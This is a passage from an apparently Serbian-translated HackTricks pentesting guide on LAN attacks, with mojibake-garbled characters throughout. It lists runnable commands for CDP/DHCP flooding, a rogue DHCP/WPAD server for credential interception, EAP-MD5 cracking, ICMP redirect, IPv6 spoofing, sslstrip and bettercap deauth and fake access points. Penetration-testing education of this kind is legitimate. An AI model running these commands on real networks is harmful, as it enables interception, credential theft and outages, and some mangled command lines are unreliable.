Tokom ovog napada, CPU prekidaÄa i CDP tabela suseda su jako optereÄ‡eni, Å¡to Äesto dovodi do onoga Å¡to se naziva **"paraliza mreÅ¾e"** zbog prekomerne potroÅ¡nje resursa.

#### Napad na impersonaciju CDP-a
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
MoÅ¾ete koristiti [**scapy**](https://github.com/secdev/scapy/). Obavezno ga instalirajte sa paketom `scapy/contrib`.

### Napadi na VoIP i alat VoIP Hopper

VoIP telefoni, sve viÅ¡e integrisani sa IoT ureÄ‘ajima, nude funkcionalnosti poput otkljuÄavanja vrata ili upravljanja termostatima putem posebnih telefonskih brojeva. MeÄ‘utim, ova integracija moÅ¾e predstavljati sigurnosne rizike.

Alat [**voiphopper**](http://voiphopper.sourceforge.net) je dizajniran da emulira VoIP telefon u razliÄitim okruÅ¾enjima (Cisco, Avaya, Nortel, Alcatel-Lucent). Otkriva VLAN ID glasovne mreÅ¾e koristeÄ‡i protokole poput CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** nudi tri moda za Cisco Discovery Protocol (CDP):

1. **ReÅ¾im Sniff** (`-c 0`): Analizira mreÅ¾ne pakete kako bi identifikovao VLAN ID.
2. **ReÅ¾im Spoof** (`-c 1`): GeneriÅ¡e prilagoÄ‘ene pakete koji imitiraju pakete stvarnog VoIP ureÄ‘aja.
3. **Spoof sa Pre-made Packet Mode** (`-c 2`): Å alje pakete identiÄne onima odreÄ‘enog modela Cisco IP telefona.

Preferirani reÅ¾im za brzinu je treÄ‡i. Potrebno je specificirati:

* MreÅ¾ni interfejs napadaÄa (parametar `-i`).
* Ime VoIP ureÄ‘aja koji se emulira (parametar `-E`), pridrÅ¾avajuÄ‡i se Cisco formata imenovanja (npr. SEP praÄ‡eno MAC adresom).

U korporativnim okruÅ¾enjima, kako bi se imitirao postojeÄ‡i VoIP ureÄ‘aj, moglo bi se:

* Pregledati MAC oznaku na telefonu.
* Pregledati informacije o modelu u postavkama ekrana telefona.
* Povezati VoIP ureÄ‘aj sa laptopom i posmatrati CDP zahteve koriÅ¡Ä‡enjem Wireshark-a.

Primer komande za izvrÅ¡avanje alata u treÄ‡em reÅ¾imu bio bi:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Napadi DHCP

#### Nabrojavanje
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Dva tipa DoS** napada mogu se izvesti protiv DHCP servera. Prvi tip podrazumeva **simuliranje dovoljno laÅ¾nih hostova kako bi se iskoristile sve moguÄ‡e IP adrese**.\
Ovaj napad Ä‡e uspeti samo ako moÅ¾ete videti odgovore DHCP servera i zavrÅ¡iti protokol (**Otkrij** (RaÄunar) --> **Ponudi** (server) --> **Zahtev** (RaÄunar) --> **Potvrda** (server)). Na primer, ovo **nije moguÄ‡e u Wifi mreÅ¾ama**.

Drugi naÄin izvoÄ‘enja DHCP DoS je slanje **DHCP-RELEASE paketa koristeÄ‡i svaku moguÄ‡u IP adresu kao izvornu adresu**. Tada Ä‡e server pomisliti da je svako zavrÅ¡io sa koriÅ¡Ä‡enjem IP adrese.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
NaÄin automatskog obavljanja ovoga je koriÅ¡Ä‡enje alata [DHCPing](https://github.com/kamorin/DHCPig)

MoÅ¾ete koristiti pomenute DoS napade da biste naterali klijente da dobiju nove zakupljene adrese unutar okruÅ¾enja, i iscrpeli legitimne servere kako bi postali neodgovorni. Tako kada legitimni pokuÅ¡aju ponovno da se poveÅ¾u, **moÅ¾ete posluÅ¾iti zlonamerne vrednosti navedene u sledeÄ‡em napadu**.

#### Postavljanje zlonamernih vrednosti

Zlonamerni DHCP server moÅ¾e biti postavljen koriÅ¡Ä‡enjem DHCP skripte smeÅ¡tene na lokaciji `/usr/share/responder/DHCP.py`. Ovo je korisno za mreÅ¾ne napade, poput hvatanja HTTP saobraÄ‡aja i akreditiva, preusmeravanjem saobraÄ‡aja ka zlonamernom serveru. MeÄ‘utim, postavljanje zlonamernog gateway-a je manje efikasno jer dozvoljava samo hvatanje odlaznog saobraÄ‡aja sa klijenta, propuÅ¡tajuÄ‡i odgovore od pravog gateway-a. Umesto toga, postavljanje zlonamernog DNS ili WPAD servera se preporuÄuje za efikasniji napad.

Ispod su opcije komandi za konfigurisanje zlonamernog DHCP servera:

* **NaÅ¡a IP adresa (OglaÅ¡avanje gateway-a)**: Koristite `-i 10.0.0.100` da oglaÅ¡avate IP vaÅ¡eg raÄunara kao gateway.
* **Lokalno DNS ime domena**: Opciono, koristite `-d example.org` da postavite lokalno DNS ime domena.
* **Originalni Router/Gateway IP**: Koristite `-r 10.0.0.1` da specificirate IP adresu legitimnog rutera ili gateway-a.
* **Primarni DNS server IP**: Koristite `-p 10.0.0.100` da postavite IP adresu zlonamernog DNS servera koji kontroliÅ¡ete.
* **Sekundarni DNS server IP**: Opciono, koristite `-s 10.0.0.1` da postavite IP adresu sekundarnog DNS servera.
* **Netmaska lokalne mreÅ¾e**: Koristite `-n 255.255.255.0` da definiÅ¡ete netmasku za lokalnu mreÅ¾u.
* **Interfejs za DHCP saobraÄ‡aj**: Koristite `-I eth1` da osluÅ¡kujete DHCP saobraÄ‡aj na odreÄ‘enom mreÅ¾nom interfejsu.
* **WPAD Konfiguraciona adresa**: Koristite `-w â€œhttp://10.0.0.100/wpad.datâ€` da postavite adresu za WPAD konfiguraciju, pomaÅ¾uÄ‡i u presretanju web saobraÄ‡aja.
* **LaÅ¾iranje IP adrese podrazumevanog gateway-a**: UkljuÄite `-S` da laÅ¾irate IP adresu podrazumevanog gateway-a.
* **Odgovor na sve DHCP zahteve**: UkljuÄite `-R` da server odgovori na sve DHCP zahteve, ali budite svesni da je ovo buÄno i moÅ¾e biti otkriveno.

Pravilnim koriÅ¡Ä‡enjem ovih opcija, zlonamerni DHCP server moÅ¾e biti uspostavljen da efikasno presretne mreÅ¾ni saobraÄ‡aj.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Napadi EAP**

Evo nekih taktika napada koje se mogu koristiti protiv implementacija 802.1X:

* Aktivno grubo silovanje lozinke putem EAP-a
* Napad na RADIUS server sa neispravnim EAP sadrÅ¾ajem _(eksploatacije)_
* Snimanje EAP poruka i offline pucanje lozinke (EAP-MD5 i PEAP)
* Prisiljavanje EAP-MD5 autentikacije da zaobiÄ‘e proveru TLS sertifikata
* Ubacivanje zlonamernog mreÅ¾nog saobraÄ‡aja prilikom autentikacije koriÅ¡Ä‡enjem hub-a ili sliÄno
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### Napadi FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) je klasa mreÅ¾nih protokola dizajnirana za **kreiranje redundantnog rutiranja**. Sa FHRP-om, fiziÄki ruteri mogu biti kombinovani u jedan logiÄki ureÄ‘aj, Å¡to poveÄ‡ava otpornost na greÅ¡ke i pomaÅ¾e u distribuciji optereÄ‡enja.

**InÅ¾enjeri kompanije Cisco Systems su razvili dva FHRP protokola, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Postoje tri verzije Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagrami se Å¡alju vrÅ¡njacima preko porta 520 koriÅ¡Ä‡enjem UDP-a od strane RIP-a i RIPv2, dok se datagrami emituju na UDP port 521 putem IPv6 multicast-a od strane RIPng. PodrÅ¡ka za MD5 autentikaciju je uvedena od strane RIPv2. S druge strane, RIPng ne ukljuÄuje nativnu autentikaciju; umesto toga, oslanja se na opcione IPsec AH i ESP zaglavlja unutar IPv6.

* **RIP i RIPv2:** Komunikacija se vrÅ¡i putem UDP datagrama na portu 520.
* **RIPng:** Koristi UDP port 521 za emitovanje datagrama putem IPv6 multicast-a.

Napomena: RIPv2 podrÅ¾ava MD5 autentikaciju dok RIPng ne ukljuÄuje nativnu autentikaciju, oslanjajuÄ‡i se na IPsec AH i ESP zaglavlja u IPv6.

### Napadi na EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** je dinamiÄki rutirni protokol. **To je distance-vector protokol.** Ako nema **autentikacije** i konfiguracije pasivnih interfejsa, **napadaÄ** moÅ¾e ometati EIGRP rutiranje i izazvati **trovanje tabela rutiranja**. Osim toga, EIGRP mreÅ¾a (tj. autonomni sistem) **je ravna i nema segmentaciju u zone**. Ako **napadaÄ ubaci rutu**, verovatno je da Ä‡e se ova ruta **proÅ¡iriti** kroz autonomni EIGRP sistem.

Napad na EIGRP sistem zahteva **uspostavljanje susedstva sa legitimnim EIGRP ruterom**, Å¡to otvara mnoge moguÄ‡nosti, od osnovnog izviÄ‘anja do razliÄitih ubrizgavanja.

[**FRRouting**](https://frrouting.org/) vam omoguÄ‡ava da implementirate **virtuelni ruter koji podrÅ¾ava BGP, OSPF, EIGRP, RIP i druge protokole.** Sve Å¡to treba da uradite je da ga implementirate na sistemu napadaÄa i zapravo moÅ¾ete se pretvarati da ste legitimni ruter u domenu rutiranja.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) ima moguÄ‡nosti za presretanje EIGRP (Enhanced Interior Gateway Routing Protocol) emitovanja. TakoÄ‘e omoguÄ‡ava ubrizgavanje paketa, Å¡to se moÅ¾e koristiti za izmenu konfiguracija rutiranja.

### OSPF

U Open Shortest Path First (OSPF) protokolu **MD5 autentikacija se Äesto koristi kako bi se osigurala sigurna komunikacija izmeÄ‘u rutera**. MeÄ‘utim, ova sigurnosna mera moÅ¾e biti kompromitovana koriÅ¡Ä‡enjem alata poput Loki i John the Ripper. Ovi alati su sposobni da uhvate i deÅ¡ifruju MD5 heÅ¡ove, otkrivajuÄ‡i autentikacioni kljuÄ. Kada se ovaj kljuÄ dobije, moÅ¾e se koristiti za unoÅ¡enje novih rutinskih informacija. Za konfigurisanje parametara rute i uspostavljanje kompromitovanog kljuÄa, koriste se kartice _Injection_ i _Connection_, redom.

* **Hvatanje i DeÅ¡ifrovanje MD5 HeÅ¡ova:** Alati poput Loki i John the Ripper se koriste u tu svrhu.
* **Konfigurisanje Parametara Rute:** To se radi putem kartice _Injection_.
* **Postavljanje Kompromitovanog KljuÄa:** KljuÄ se konfiguriÅ¡e pod karticom _Connection_.

### Ostali GeneriÄki Alati i Izvori

* [**Above**](https://github.com/c4s73r/Above): Alat za skeniranje mreÅ¾nog saobraÄ‡aja i pronalaÅ¾enje ranjivosti
* MoÅ¾ete pronaÄ‡i **viÅ¡e informacija o mreÅ¾nim napadima** [**ovde**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Falsifikovanje**

NapadaÄ konfiguriÅ¡e sve mreÅ¾ne parametre (GW, IP, DNS) novog Älana mreÅ¾e slanjem laÅ¾nih DHCP odgovora.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Proverite [prethodni odeljak](./#arp-spoofing).

### ICMPRedirect

ICMP preusmeravanje se sastoji od slanja ICMP paketa tipa 1 kÃ´da 5 koji ukazuje da je napadaÄ najbolji naÄin da se doÄ‘e do odreÄ‘ene IP adrese. Zatim, kada Å¾rtva Å¾eli da kontaktira tu IP adresu, paket Ä‡e biti poslat preko napadaÄa.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

NapadaÄ Ä‡e reÅ¡iti neke (ili sve) domene za koje Å¾rtva traÅ¾i.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**KonfiguriÅ¡ite sopstveni DNS pomoÄ‡u dnsmasq-a**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalni prolazi

ÄŒesto postoje viÅ¡e ruta do sistema i mreÅ¾a. Nakon Å¡to napravite listu MAC adresa unutar lokalne mreÅ¾e, koristite _gateway-finder.py_ da identifikujete hostove koji podrÅ¾avaju IPv4 prosleÄ‘ivanje.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Falsifikovanje LLMNR, NBT-NS i mDNS](falsifikovanje-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Za lokalno razreÅ¡avanje imena kada DNS upiti ne uspeju, Microsoft sistemi se oslanjaju na **Link-Local Multicast Name Resolution (LLMNR)** i **NetBIOS Name Service (NBT-NS)**. SliÄno tome, **Apple Bonjour** i **Linux zero-configuration** implementacije koriste **Multicast DNS (mDNS)** za otkrivanje sistema unutar mreÅ¾e. Zbog neautentifikovane prirode ovih protokola i njihovog rada preko UDP, emitovanjem poruka, oni mogu biti iskoriÅ¡Ä‡eni od strane napadaÄa koji ciljaju da preusmere korisnike ka zlonamernim servisima.

MoÅ¾ete se predstaviti kao servisi koje traÅ¾e hostovi koristeÄ‡i Responder za slanje laÅ¾nih odgovora.\
ProÄitajte viÅ¡e informacija o [kako se predstaviti kao servis pomoÄ‡u Responder-a](falsifikovanje-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsifikovanje WPAD-a](falsifikovanje-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

PregledaÄi Äesto koriste **Web Proxy Auto-Discovery (WPAD) protokol za automatsko dobijanje podeÅ¡avanja proksija**. To ukljuÄuje dobijanje detalja konfiguracije sa servera, posebno putem URL-a poput "http://wpad.example.org/wpad.dat". Otkrivanje ovog servera od strane klijenata moÅ¾e se desiti putem razliÄitih mehanizama:

* Putem **DHCP**, gde se otkrivanje olakÅ¡ava koriÅ¡Ä‡enjem specijalnog unosa koda 252.
* Preko **DNS-a**, Å¡to ukljuÄuje traÅ¾enje imena hosta oznaÄenog sa _wpad_ unutar lokalne domene.
* Putem **Microsoft LLMNR i NBT-NS**, koji su rezervni mehanizmi koriÅ¡teni u sluÄajevima kada DNS upiti ne uspeju.

Alat Responder iskoriÅ¡Ä‡ava ovaj protokol delujuÄ‡i kao **zlonamerni WPAD server**. Koristi DHCP, DNS, LLMNR i NBT-NS da zavede klijente da se poveÅ¾u sa njim. Da biste dublje istraÅ¾ili kako se servisi mogu predstaviti koriÅ¡Ä‡enjem Responder-a [proverite ovo](falsifikovanje-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Falsifikovanje SSDP i UPnP ureÄ‘aja](falsifikovanje-ssdp-and-upnp-devices.md)

MoÅ¾ete ponuditi razliÄite servise u mreÅ¾i kako biste **prevarili korisnika** da unese neke **plain-text kredencijale**. **ViÅ¡e informacija o ovom napadu u** [**Falsifikovanje SSDP i UPnP ureÄ‘aja**](falsifikovanje-ssdp-and-upnp-devices.md)**.**

### IPv6 Falsifikovanje Suseda

Ovaj napad je veoma sliÄan ARP Falsifikovanju ali u svetu IPv6. MoÅ¾ete naterati Å¾rtvu da pomisli da IPv6 GW ima MAC adresu napadaÄa.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Neke OS konfiguriÅ¡u podrazumevano gateway iz RA paketa poslatih u mreÅ¾i. Da biste proglasili napadaÄa kao IPv6 ruter, moÅ¾ete koristiti:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Podrazumevano, neki operativni sistemi pokuÅ¡avaju da konfiguriÅ¡u DNS Äitanjem DHCPv6 paketa u mreÅ¾i. Zatim, napadaÄ moÅ¾e poslati DHCPv6 paket da se konfiguriÅ¡e kao DNS. DHCP takoÄ‘e pruÅ¾a IPv6 adresu Å¾rtvi.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (laÅ¾na stranica i ubacivanje JS koda)

## Internet napadi

### sslStrip

Osnovno Å¡to ovaj napad radi je, u sluÄaju da **korisnik** pokuÅ¡a **pristupiti** **HTTP** stranici koja se **preusmjerava** na **HTTPS** verziju. **sslStrip** Ä‡e **odrÅ¾avati** **HTTP vezu sa** **klijentom i** **HTTPS vezu sa** **serverom** tako da Ä‡e moÄ‡i da **uhvati** vezu u **Äistom tekstu**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
ViÅ¡e informacija [ovde](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy za zaobilaÅ¾enje HSTS

**Razlika** izmeÄ‘u **sslStrip+ i dns2proxy** u odnosu na **sslStrip** je Å¡to Ä‡e **preusmeriti** na primer _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (primetite **dodatno** slovo "**w**") i postaviÄ‡e **IP adresu napadaÄa** kao adresu ovog domena. Na ovaj naÄin, **klijent** Ä‡e se **povezati** na _**wwww.facebook.com**_ (napadaÄa), ali iza kulisa **sslstrip+** Ä‡e **odrÅ¾avati** **pravu vezu** putem https sa **www.facebook.com**.

**Cilj** ove tehnike je da **izbegne HSTS** jer se _**wwww**.facebook.com_ **neÄ‡e** saÄuvati u keÅ¡u pregledaÄa, pa Ä‡e pregledaÄ biti prevaren da izvrÅ¡i **autentikaciju na Facebook-u preko HTTP**.\
Imajte na umu da bi se izveo ovaj napad, Å¾rtva mora pokuÅ¡ati pristupiti poÄetno [http://www.faceook.com](http://www.faceook.com) a ne https. To se moÅ¾e postiÄ‡i modifikovanjem linkova unutar http stranice.

ViÅ¡e informacija [ovde](https://www.bettercap.org/legacy/#hsts-bypass), [ovde](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [ovde](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ili sslStrip+ viÅ¡e ne funkcioniÅ¡u. To je zato Å¡to postoje HSTS pravila unapred saÄuvana u pregledaÄima, pa Äak i ako je prvi put da korisnik pristupa "vaÅ¾nom" domenu, pristupiÄ‡e mu putem HTTPS. TakoÄ‘e, primetite da unapred saÄuvana pravila i druga generisana pravila mogu koristiti zastavicu** [**`includeSubdomains`**](https://hstspreload.appspot.com) **tako da primer _**wwww.facebook.com**_ od ranije viÅ¡e neÄ‡e funkcionisati jer** _**facebook.com**_ **koristi HSTS sa `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP sluÅ¡anje na portu
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL osluÅ¡kivanje na portu

#### Generisanje kljuÄeva i samopotpisanog sertifikata
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### SluÅ¡ajte koristeÄ‡i sertifikat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### SluÅ¡ajte koristeÄ‡i sertifikat i preusmerite ka hostovima
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Ponekad, ako klijent proveri da li je CA validan, moÅ¾ete **posluÅ¾iti sertifikat drugog imena hosta potpisan od strane CA**.\
JoÅ¡ jedan interesantan test je da posluÅ¾ite **sertifikat za traÅ¾eni hostname ali samopotpisan**.

Drugi naÄini testiranja su pokuÅ¡aj potpisivanja sertifikata validnim sertifikatom koji nije validan CA. Ili koriÅ¡Ä‡enje validnog javnog kljuÄa, prinuditi koriÅ¡Ä‡enje algoritma poput Diffie-Hellman-a (koji ne zahteva deÅ¡ifrovanje bilo Äega sa pravim privatnim kljuÄem) i kada klijent zatraÅ¾i probu pravog privatnog kljuÄa (poput heÅ¡a), poslati laÅ¾nu probu i oÄekivati da klijent to ne proveri.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### BeleÅ¡ke o aktivnom otkrivanju

Imajte na umu da kada se UDP paket poÅ¡alje ureÄ‘aju koji nema traÅ¾eni port, Å¡alje se ICMP (Port Unreachable).

### **ARP otkrivanje**

ARP paketi se koriste za otkrivanje IP adresa koje se koriste unutar mreÅ¾e. RaÄunar mora poslati zahtev za svaku moguÄ‡u IP adresu i samo Ä‡e one koje se koriste odgovoriti.

### **mDNS (multicast DNS)**

Bettercap Å¡alje MDNS zahtev (svakih X ms) traÅ¾eÄ‡i **\_services\_.dns-sd.\_udp.local** maÅ¡ina koje vide ovaj paket obiÄno odgovaraju na ovaj zahtev. Zatim, traÅ¾i samo maÅ¡ine koje odgovaraju na "services".

**Alati**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap emituje pakete na port 137/UDP traÅ¾eÄ‡i ime "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap emituje SSDP pakete traÅ¾eÄ‡i sve vrste usluga (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap emituje WSD pakete traÅ¾eÄ‡i usluge (UDP Port 3702).

## Reference

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Savet za bug bounty**: **Prijavite se** za **Intigriti**, premium **platformu za bug bounty kreiranu od hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
